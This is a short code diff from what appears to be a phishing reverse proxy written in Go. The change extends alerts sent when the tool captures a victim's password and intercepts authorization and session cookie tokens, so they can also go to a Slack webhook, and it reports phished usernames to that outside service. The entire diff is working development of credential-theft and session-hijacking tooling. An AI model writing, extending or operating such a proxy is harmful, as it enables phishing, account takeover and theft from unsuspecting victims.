@@ -778,10 +778,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
-											if phishedUser != "" && p.cfg.kbWebhookUrl != "" {
+											if phishedUser != "" && (p.cfg.kbWebhookUrl != "" || p.cfg.slackWebhookUrl != "") {
 												notify := fmt.Sprintf("Captured credentials for %s!", phishedUser)
 												p.WebhookNotify(notify)
-											} else if phishedUser == "" && p.cfg.kbWebhookUrl != "" {
+											} else if phishedUser == "" && (p.cfg.kbWebhookUrl != "" || p.cfg.slackWebhookUrl != "") {
 												notify := "Credentials captured!"
 												p.WebhookNotify(notify)
 											}
@@ -1060,8 +1060,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-						if p.cfg.kbWebhookUrl != "" {
-							notify := "Authorization tokens intercpeted!"
+						if p.cfg.kbWebhookUrl != "" || p.cfg.slackWebhookUrl != "" {
+							notify := "Authorization tokens intercepted!"
 							p.WebhookNotify(notify)
 						}
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
